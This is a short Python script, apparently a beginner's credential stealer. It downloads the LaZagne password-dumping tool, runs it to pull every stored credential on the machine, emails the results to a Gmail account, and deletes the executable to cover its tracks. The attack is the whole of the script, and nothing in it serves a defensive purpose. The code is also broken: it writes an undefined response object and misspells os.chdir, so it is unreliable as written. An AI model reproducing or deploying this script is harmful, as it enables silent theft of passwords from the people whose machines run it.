import subprocess, smtplib, requests, os
import tempfile


def download(url, get_response=None):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")


# send emails to myself
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chir(temp_directory)

result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(" mail", "pass", result)
os.remove("laZagne.exe")
